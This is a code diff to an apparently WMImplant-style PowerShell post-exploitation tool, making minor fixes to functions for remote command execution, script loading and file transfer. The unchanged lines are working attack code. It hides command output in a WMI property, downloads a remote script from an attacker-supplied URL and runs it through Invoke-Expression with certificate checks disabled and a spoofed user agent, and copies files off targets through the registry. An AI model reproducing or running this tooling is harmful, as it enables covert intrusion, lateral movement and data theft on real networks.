@@ -478,7 +478,7 @@ function Get-InstalledPrograms
 
         # On remote system, save file to registry
         Write-Verbose "Running remote command and writing on remote registry"
-        $remote_command = '$fct = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | format-list | out-string; $fctenc=[Int[]][Char[]]$fct -Join '',''; $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $fctenc; $a.Put()'
+        $remote_command = '$fct = (Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | format-list | out-string).Trim(); $fctenc=[Int[]][Char[]]$fct -Join '',''; $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $fctenc; $a.Put()'
 
         if($Creds)
         {
@@ -505,7 +505,7 @@ function Get-InstalledPrograms
         Write-Verbose "Replacing original WMI property value from remote system"
 
         $modified_WMIObject.DebugFilePath = $Original_WMIProperty
-        $modified_WMIObject.Put()
+        $null = $modified_WMIObject.Put()
         
         Write-Verbose "Done!"
     }
@@ -700,7 +700,7 @@ function Invoke-CommandExecution
         Write-Verbose "Building PowerShell command"
 
         $remote_command = '$output = '
-        $remote_command += "$ExecCommand;"
+        $remote_command += "($ExecCommand | Out-String).Trim();"
         $remote_command += ' $EncodedText = [Int[]][Char[]]$output -Join '','';'
         $remote_command += ' $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()'
 
@@ -717,7 +717,7 @@ function Invoke-CommandExecution
 
         # Grab output from remote system
         Write-Verbose "Sleeping, and then reading output from remote WMI Property"
-        Start-Sleep -s 30
+        Start-Sleep -s 10
 
         $modified_WMIObject = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
 
@@ -729,7 +729,7 @@ function Invoke-CommandExecution
         Write-Verbose "Replacing WMI Property"
 
         $modified_WMIObject.DebugFilePath = $Original_WMIProperty
-        $modified_WMIObject.Put()
+        $null = $modified_WMIObject.Put()
 
         Write-Verbose "Done!"
     }
@@ -1889,7 +1889,7 @@ function Invoke-RemoteScriptWithOutput
         $remote_command = '[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.Webclient; $wc.Headers.Add(''User-Agent'',''Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko''); $wc.proxy=[System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials; Invoke-Expression ($wc.downloadstring('
         $remote_command += "'$Url'"
         $remote_command += ')); $output = '
-        $remote_command += "$Function;"
+        $remote_command += "($Function | Out-String).Trim();"
         $remote_command += ' $EncodedText = [Int[]][Char[]]$output -Join '','';'
         $remote_command += ' $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()'
 
@@ -1917,7 +1917,7 @@ function Invoke-RemoteScriptWithOutput
         # Removing Registry value from remote system
         Write-Verbose "Removing registry value from remote system"
         $modified_WMIObject.DebugFilePath = $Original_WMIProperty
-        $modified_WMIObject.Put()
+        $null = $modified_WMIObject.Put()
 
         Write-Verbose "Done!"
     }
@@ -3962,7 +3962,7 @@ function Get-FileContentsWMImplant
         }
 
         Write-Verbose "Sleeping to let remote system read and store file"
-        Start-Sleep -s 30
+        Start-Sleep -s 15
 
         # Grab file from remote system
         Write-Verbose "Reading file from remote system"
@@ -3977,7 +3977,7 @@ function Get-FileContentsWMImplant
         Write-Verbose "Removing registry value from remote system"
 
         $modified_WMIObject.DebugFilePath = $Original_WMIProperty
-        $modified_WMIObject.Put()
+        $null = $modified_WMIObject.Put()
 
         Write-Verbose "Done!"
     }
@@ -4057,7 +4057,7 @@ function Invoke-FileTransferWMImplant
 
             # On remote system, save file to registry
             Write-Verbose "Reading remote file and writing on remote registry"
-            $remote_command = '$fct = Get-Content -Path ''' + "$Download_file" + '''; $fctenc = [Int[]][Char[]]$fct -Join '',''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
+            $remote_command = '$fct = Get-Content -Encoding byte -Path ''' + "$Download_file" + '''; $fctenc = [Int[]][Char[]]$fct -Join '',''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'
 
             if($Creds)
             {
@@ -4136,7 +4136,7 @@ function Invoke-FileTransferWMImplant
 
             # Read in file and base64 encode it
             Write-Verbose "Read in local file and base64 encode it"
-            $filecontents = Get-Content $Upload_File
+            $filecontents = Get-Content -Encoding byte $Upload_File
             $filecontentencoded = [Int[]][Char[]]$filecontents -Join ','
 
             Write-Verbose "Writing encoded file to local registry"
